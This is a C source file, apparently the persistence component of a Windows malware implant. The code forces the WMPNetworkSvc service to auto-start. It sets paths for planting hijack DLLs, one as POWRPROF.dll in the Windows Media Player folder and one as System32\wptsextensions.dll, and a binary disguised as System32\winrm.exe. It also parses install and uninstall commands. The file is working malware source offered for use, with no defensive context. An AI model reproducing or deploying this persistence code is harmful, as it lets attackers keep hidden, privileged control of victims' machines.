#include "persistence.h"
#include "common.h"
#include <winsvc.h>
BOOL start_service() {
	SC_HANDLE open_sc = OpenSCManagerA(NULL,
		NULL, SC_MANAGER_ALL_ACCESS);
	SC_HANDLE sc = OpenServiceA(open_sc, "WMPNetworkSvc", SERVICE_ALL_ACCESS);
	SERVICE_DELAYED_AUTO_START_INFO si;
	SERVICE_STATUS_PROCESS ssp;
	StartServiceA(sc, 0, NULL);
	CloseServiceHandle(sc);
	CloseServiceHandle(open_sc);

}
BOOL change_service_config() {
	SC_HANDLE open_sc = OpenSCManagerA(NULL,
		NULL, SC_MANAGER_ALL_ACCESS);
	SC_HANDLE sc = OpenServiceA(open_sc, "WMPNetworkSvc", SERVICE_ALL_ACCESS);
	SERVICE_DELAYED_AUTO_START_INFO si;
	si.fDelayedAutostart = TRUE;
	ChangeServiceConfigA(sc, SERVICE_NO_CHANGE, SERVICE_AUTO_START, SERVICE_NO_CHANGE, 0, 0, 0, 0, 0, 0, 0);
	//if (ChangeServiceConfig2A(sc, SERVICE_CONFIG_DELAYED_AUTO_START_INFO, &si)) {
	//	return TRUE;
	//}
	//else {
	//	return FALSE;
	//}
	SERVICE_STATUS_PROCESS ssp;
	ControlService(sc, SERVICE_CONTROL_STOP, &ssp);
	CloseServiceHandle(sc);
	CloseServiceHandle(open_sc);

}

Ppellet_dirs get_persist_locations(enum persis_method methods) {
	char* winrm_path = "C:\\Program Files\\Windows Media Player\\POWRPROF.dll";
	char* winipt_path = NULL;
		
	char* bin_dir = NULL;
	BOOL barch;/*
	IsWow64Process(GetCurrentProcess(), &barch);
	if (barch == TRUE) {
		 winipt_path = "C:\\Windows\\Sysnative\\wptsextensions.dll";
		 bin_dir = "C:\\Windows\\Sysnative\\winrm.exe";

	}
	else {*/
		 winipt_path = "C:\\Windows\\System32\\wptsextensions.dll";
		 bin_dir = "C:\\Windows\\System32\\winrm.exe";

	/*}*/
	Ppellet_dirs pdirs = allocheap(sizeof(struct pellet_dirs));
	ZeroMemory(pdirs, sizeof(struct pellet_dirs));
	if (methods == winrm) {
		pdirs->pellet_write_loc = allocheap(strlen(winrm_path) + 1);
		ZeroMemory(pdirs->pellet_write_loc, strlen(winrm_path) + 1);
		strcpy(pdirs->pellet_write_loc, winrm_path);
	}
	else if (methods == winipt) {
		pdirs->pellet_write_loc = allocheap(strlen(winipt_path) + 1);
		ZeroMemory(pdirs->pellet_write_loc, strlen(winipt_path) + 1);
		strcpy(pdirs->pellet_write_loc, winipt_path);
	}
	else {
		return NULL;
	}
	pdirs->bin_write_loc = allocheap(strlen(bin_dir) + 1);
	ZeroMemory(pdirs->bin_write_loc, strlen(bin_dir) + 1);
	strcpy(pdirs->bin_write_loc, bin_dir);
	return pdirs;
}
enum persis_operation select_operation(char* method) {
	char* method_temp = NULL;
	enum persis_operation persis_op;
	persis_op = no_operation;
	for (int i = 0; i <= TOTAL_METHODS; i++) {
		method_temp = strstrA(method, operation_methods[i]);
		if (method_temp) {
			if (i == 0) {
				persis_op = install;
				goto done;
			}
			else if (i == 1) {
				persis_op = uninstall;
				goto done;
			}
			else
				persis_op = no_operation;

		}
	}
done:
	return persis_op;

}
enum persis_method select_methods(char* method) {
	char* method_temp = NULL;
	enum persis_method vr2_query;
	vr2_query = persist_no_method;

	for (int i = 0; i <= TOTAL_METHODS; i++) {
		method_temp = StrStrA(method, methods[i]);
		if (method_temp) {
			if (i == 0) {
				vr2_query = winrm;
				goto done;
			}
			else if (i == 1) {

				vr2_query = winipt;
				goto done;
			}
			else
				vr2_query = persist_no_method;

		}
	}
done:

	return vr2_query;
}

void free_persist_locations(Ppellet_dirs pdirs) {
	freeheap(pdirs->pellet_write_loc);
	freeheap(pdirs->bin_write_loc);
	freeheap(pdirs);
}